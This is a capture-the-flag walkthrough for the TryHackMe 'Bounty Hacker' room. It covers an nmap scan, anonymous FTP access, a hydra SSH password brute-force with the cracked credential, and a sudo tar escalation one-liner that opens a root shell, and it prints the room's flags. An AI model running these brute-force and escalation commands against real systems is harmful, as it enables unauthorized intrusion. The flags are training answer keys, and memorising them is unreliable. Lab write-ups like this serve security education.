###### You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!
Room: https://tryhackme.com/room/cowboyhacker
##

**sudo nmap** -sS -sV -T5 -vv xx.xx.xx.xx
```
PORT      STATE  SERVICE         REASON         VERSION
20/tcp    closed ftp-data        reset ttl 63
21/tcp    open   ftp             syn-ack ttl 63 vsftpd 3.0.3
22/tcp    open   ssh             syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp    open   http            syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
```
The website running on port 80 seems like a dead end.  

Anonymously login into FTP. 
* locks.txt seems to be a list of passwords.
* task.txt gives us a username, lin.

Let's try and combine these informations and bruteforce the SSH.  
**sudo** hydra -l lin -P locks.txt xx.xx.xx.xx ssh  

```
[22][ssh] host: 10.10.67.57   login: lin   password: RedDr4gonSynd1cat3
```

**First flag, content of user.txt** **[1]**  
> THM{CR1M3_SyNd1C4T3}

Checkin the **sudo -l** command, we see that we can run **tar** as root.  
According to [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo)  
**sudo tar** -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

```
# whoami
root
```

**Second flag, content of /root/root.txt** **[2]**  
> THM{80UN7Y_h4cK3r}

